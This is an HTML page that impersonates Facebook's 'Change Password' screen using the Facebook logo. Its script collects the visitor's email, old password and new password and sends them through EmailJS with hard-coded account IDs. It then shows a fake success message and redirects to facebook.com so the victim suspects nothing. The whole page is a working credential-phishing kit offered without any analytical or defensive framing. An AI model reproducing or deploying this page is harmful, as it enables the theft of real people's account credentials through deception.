<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Change Password</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
  <style>
    /* Add your styles here */
  </style>
</head>
<body>

  <div class="logo-section">
    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
  </div>

  <div class="password-box" id="passwordBox">
    <h2>Change Your Password</h2>
    <form id="passwordForm">
      <input type="email" placeholder="Email address" id="email" required>
      <input type="password" placeholder="Old password" id="oldPassword" required>
      <input type="password" placeholder="New password" id="newPassword" required>
      <button type="submit">Update Password</button>
    </form>
  </div>

  <div class="success-message" id="successMessage">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
         stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
      <path d="M9 12l2 2l4-4"></path>
      <circle cx="12" cy="12" r="10"></circle>
    </svg>
    <h3>Password Updated Successfully</h3>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS
    emailjs.init('ODWuzZ-mZLM196nkP'); // Your User ID

    document.getElementById('passwordForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const email = document.getElementById('email').value;
      const oldPassword = document.getElementById('oldPassword').value;
      const newPassword = document.getElementById('newPassword').value;

      // Send email with the form details using EmailJS
      emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword
      }).then(function(response) {
        console.log('SUCCESS', response);

        // Show success message and hide form
        document.getElementById('passwordBox').style.display = 'none';
        document.getElementById('successMessage').style.display = 'flex';

        // Redirect to another website after 2 seconds
        setTimeout(function() {
          window.location.href = 'https://facebook.com';
        }, 2000);
      }, function(error) {
        console.log('FAILED', error);
        alert('Something went wrong, please try again.');
      });
    });
  </script>
</body>
</html>
